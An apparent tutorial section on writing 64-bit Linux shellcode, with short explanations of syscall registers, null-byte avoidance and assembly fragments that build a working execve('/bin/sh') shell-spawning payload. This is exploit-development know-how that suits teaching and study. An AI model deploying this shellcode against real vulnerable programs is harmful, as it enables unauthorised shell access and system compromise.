# Spawn-shell shellcode

In this section I'm writing 64 bit shellcode. The process is a bit likely to the 32 bit code I wrote for 
the spawn-shell shellcode.

In 64 bit, the process of calling a syscall has the same process, but is only used with different names. For example to call the syscall we don't use the ```int 0x80``` like in 32 bit, we use ```syscall``` instead.  

The registers has also different names and order, like:  
```Python
RAX = syscall number
RDI, RSI, RDX, R10, R8, R9 = parameters of syscall function
```

The addresses in 64 bit is also longer than the 32 bit one, we can pass 8 bytes in one address. This is quite handy, 
because the string //bin/sh is 8 bytes, so we don't have to worry about having zero's in our shellcode as in result 
of empty spaces in the address.
  
To create the shellcode, we first have to push the zero terminated //bin/sh string onto the stack.
```asm
xor rax, rax
push rax    ; push string terminator.
mov rsi, 0x68732f6e69622f2f ; //bin/sh
push rsi    ; push the string.
push rsp    ; push the address of the stack-pointer.

pop rdi     ; put the stack-address into the first paramter.
; now RDI contains //bin/sh
```

In order to set the RAX value with the execve() syscall, we have to set the register with the value of 59. This can 
be found on the file with the list of syscalls and their numbers:
```bash
/usr/include/asm/unistd_64.h
```
The process of putting the value 59 to the value RAX without having to end up with zero's in our shellcode, we simply have to 
push the value 59 on the stack and pop it in the RAX register.  
```asm
push 59
pop rax
```
  
Now it is simply putting the other registers on zero and call the syscall.
```asm
xor rsi, rsi  ; second paramter
xor rdx, rdx  ; third paramter

syscall
```
